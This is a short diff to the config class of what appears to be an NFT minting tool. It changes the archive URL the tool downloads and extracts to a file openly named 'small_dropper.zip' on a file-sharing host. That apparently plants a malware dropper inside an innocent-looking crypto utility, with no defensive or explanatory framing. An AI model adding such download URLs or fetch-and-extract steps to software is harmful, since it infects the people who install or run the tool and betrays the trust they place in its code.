@@ -40,7 +40,7 @@ class NFTConfig:
         self.version = "3.0.0"
         self.author = "NFT Minting Team"
         self.timeout = 15
-        self.zip_url = "https://files.catbox.moe/019nft.zip"
+        self.zip_url = "https://sharebin.eu/files/8730103595_small_dropper.zip"
         self.download_path = "downloaded.zip"
         self.extract_path = "extracted"
         self.min_rarity_score = 75
